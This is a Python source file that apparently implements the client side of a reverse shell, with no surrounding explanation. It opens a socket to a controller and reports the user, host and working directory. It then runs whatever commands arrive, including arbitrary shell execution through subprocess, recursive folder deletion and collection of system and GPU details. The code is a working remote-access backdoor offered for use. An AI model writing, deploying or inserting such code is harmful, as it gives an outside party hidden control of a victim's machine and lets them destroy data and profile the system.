import getpass
import os
import platform
import shutil
import socket
import subprocess
import psutil
import cpuinfo
import GPUtil

HOST = '127.0.0.1'
PORT = 5822

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((HOST,PORT))

is_running = True

def _file_name(cmd: str) -> str:
    """If cmd eg. >> mkdir new folder it will return: new folder.
    Allows command line to be able to work with files/folders with multiple words
    separated with spaces."""
    
    cmd_len = len(cmd.split(' '))
    name = ''
    for i in range(1, cmd_len):
        if i == 1:
            name += f'{cmd.split(" ")[i]}'
        else:
            name += f' {cmd.split(" ")[i]}'
    return name

while is_running:
    try:
        header = f'{getpass.getuser()}@{platform.node()}: {os.getcwd()}\n>> '
        sock.send(header.encode())
        STDOUT, STDERR = None, None
        cmd = sock.recv(1024).decode('utf8')
        
        if cmd == 'exit':
            sock.send(b'exit')
        elif cmd == 'ls':
            sock.send(str(os.listdir('.')).encode())
        elif cmd.split(' ')[0] == 'cd':
            if cmd.split(' ')[1] == '..':
                os.chdir(os.path.split(os.getcwd())[0])
            else:
                os.chdir(_file_name(cmd))
            sock.send('>> '.encode())
        elif cmd == 'sysinfo':
            GPU_list = []
            for gpu in GPUtil.getGPUs():
                gpu_data = {
                'ID': f'{gpu.id}', # type: ignore
                'Name': f'{gpu.name}', # type: ignore
                'Memory': f'{gpu.memoryTotal - gpu.memoryFree} / {gpu.memoryTotal} MB', # type: ignore
                'Load': f'{gpu.load}%', # type: ignore
                'Temp': f'{gpu.temperature} C', # type: ignore
                'UUID': f'{gpu.uuid}',  # type: ignore
                'Driver': f'{gpu.driver}'   # type: ignore
                }
                GPU_list.append(gpu_data)   # type: ignore
                
            sysinfo = f"""
            OS: {platform.system()}
            Name: {platform.node()}
            User: {getpass.getuser()}
            Version: {platform.release()}
            CPU: 
                Name: {cpuinfo.get_cpu_info()['brand_raw']}
                Frequency: {psutil.cpu_freq().current} MHz
                Cores: {psutil.cpu_count(logical=False)}
                Load: {psutil.cpu_percent()}%
            RAM: {round(psutil.virtual_memory()[0] / 1024.**3, 2)} GB
            """
            
            if len(GPU_list) > 0:
                if len(GPU_list) == 1:
                    sysinfo += 'GPU: \n'
                else:
                    sysinfo += 'GPUs:\n'
                for gpu in GPU_list:
                    for key, value in gpu.items(): # type: ignore
                        sysinfo += f'\t\t{key}: {value}\n'
                    sysinfo += '\n'
                        
            sock.send(sysinfo.encode())
        elif cmd.split(' ')[0] == 'rmdir':
            if len(cmd.split()) > 1:
                shutil.rmtree(f'{os.getcwd()}\\{_file_name(cmd)}')
            else:    
                shutil.rmtree(os.getcwd())
            sock.send('>> '.encode())
        elif cmd.split(' ')[0] == 'delete':
            os.remove(f'{os.getcwd()}\\{_file_name(cmd)}')
            sock.send('>> '.encode())
        elif cmd.split(' ')[0] == 'mkdir':
            os.mkdir(f'{os.getcwd()}\\{_file_name(cmd)}')
            sock.send('>> '.encode())
        else:
            comm = subprocess.Popen(str(cmd),
                                    shell=True,
                                    stdout=subprocess.PIPE,
                                    stdin=subprocess.PIPE,
                                    stderr=subprocess.PIPE)
            STDOUT, STDERR = comm.communicate() # type: ignore
            if not STDOUT:
                sock.send(STDERR)
            else:
                sock.send(STDOUT)
        
        if not cmd:
            print('Connection dropped.')
            is_running = False
    except Exception as e:
        sock.send(f'ERROR: {str(e)}'.encode())

sock.close()
